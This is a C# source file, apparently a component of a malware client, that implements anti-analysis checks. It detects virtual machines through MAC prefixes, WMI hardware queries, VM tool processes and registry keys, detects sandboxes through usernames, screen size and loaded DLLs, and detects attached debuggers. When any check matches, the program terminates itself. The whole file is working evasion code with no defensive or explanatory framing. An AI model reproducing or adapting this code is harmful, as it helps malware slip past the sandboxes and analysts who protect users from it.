using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;

namespace Client.Helper
{
    class Anti_Analysis
    {
        public static void RunAntiAnalysis()
        {
            if (IsVirtualMachine() || IsSandbox() || IsDebuggerPresent())
            {
                Environment.FailFast(null);
            }
            Thread.Sleep(1000);
        }

        public static bool IsVirtualMachine()
        {
            return CheckWMI() || CheckMacAddress() || CheckManufacturer() || 
                   CheckProcesses() || CheckRegistry() || CheckHardware();
        }

        private static bool CheckWMI()
        {
            try
            {
                SelectQuery selectQuery = new SelectQuery("Select * from Win32_CacheMemory");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(selectQuery);
                int count = 0;
                foreach (ManagementObject obj in searcher.Get())
                {
                    count++;
                }
                if (count == 0) return true;
            }
            catch { }
            return false;
        }

        private static bool CheckMacAddress()
        {
            try
            {
                string[] vmMacPrefixes = { "00-05-69", "00-0C-29", "00-1C-14", "00-50-56", 
                                          "08-00-27", "00-15-5D", "00-03-FF" };
                
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    string mac = nic.GetPhysicalAddress().ToString();
                    if (mac.Length >= 6)
                    {
                        string prefix = string.Format("{0}-{1}-{2}", 
                            mac.Substring(0, 2), mac.Substring(2, 2), mac.Substring(4, 2));
                        if (vmMacPrefixes.Any(p => prefix.StartsWith(p, StringComparison.OrdinalIgnoreCase)))
                            return true;
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool CheckManufacturer()
        {
            try
            {
                string[] vmManufacturers = { "microsoft corporation", "vmware", "virtualbox", 
                                            "parallels", "qemu", "xen", "virtual", "innotek" };
                
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string manufacturer = obj["Manufacturer"]?.ToString().ToLower() ?? "";
                        string model = obj["Model"]?.ToString().ToLower() ?? "";
                        
                        if (vmManufacturers.Any(vm => manufacturer.Contains(vm) || model.Contains(vm)))
                            return true;
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool CheckProcesses()
        {
            try
            {
                string[] vmProcesses = { "vmtoolsd", "vmwaretray", "vmwareuser", "vboxservice", 
                                        "vboxtray", "vmusrvc", "prl_tools", "qemu-ga", "xenservice" };
                
                Process[] processes = Process.GetProcesses();
                foreach (Process proc in processes)
                {
                    try
                    {
                        if (vmProcesses.Any(vmp => proc.ProcessName.ToLower().Contains(vmp)))
                            return true;
                    }
                    catch { }
                }
            }
            catch { }
            return false;
        }

        private static bool CheckRegistry()
        {
            try
            {
                string[] vmRegistryKeys = {
                    @"SOFTWARE\VMware, Inc.\VMware Tools",
                    @"SOFTWARE\Oracle\VirtualBox Guest Additions",
                    @"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0"
                };

                foreach (string keyPath in vmRegistryKeys)
                {
                    try
                    {
                        using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(keyPath))
                        {
                            if (key != null)
                                return true;
                        }
                    }
                    catch { }
                }
            }
            catch { }
            return false;
        }

        private static bool CheckHardware()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        int processors = Convert.ToInt32(obj["NumberOfLogicalProcessors"]);
                        ulong totalMemory = Convert.ToUInt64(obj["TotalPhysicalMemory"]);
                        
                        if (processors < 2 || totalMemory < 2147483648) // < 2GB RAM
                            return true;
                    }
                }

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_DiskDrive"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        ulong size = Convert.ToUInt64(obj["Size"]);
                        if (size < 64424509440) // < 60GB
                            return true;
                    }
                }
            }
            catch { }
            return false;
        }

        public static bool IsSandbox()
        {
            try
            {
                string[] sandboxUsernames = { "sandbox", "malware", "virus", "test", "sample", "currentuser" };
                string[] sandboxComputernames = { "sandbox", "malware", "virus", "test", "sample" };
                
                string username = Environment.UserName.ToLower();
                string computername = Environment.MachineName.ToLower();
                
                if (sandboxUsernames.Any(s => username.Contains(s)) || 
                    sandboxComputernames.Any(s => computername.Contains(s)))
                    return true;

                var screen = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                if (screen.Width < 1024 || screen.Height < 768)
                    return true;

                string[] sandboxDlls = { "sbiedll.dll", "dbghelp.dll", "api_log.dll", "dir_watch.dll" };
                foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
                {
                    if (sandboxDlls.Any(dll => module.ModuleName.ToLower().Contains(dll)))
                        return true;
                }
            }
            catch { }
            return false;
        }

        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll")]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        public static bool IsDebuggerAttached()
        {
            try
            {
                if (Debugger.IsAttached || IsDebuggerPresent())
                    return true;

                bool isDebuggerPresent = false;
                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                return isDebuggerPresent;
            }
            catch { }
            return false;
        }
    }
}
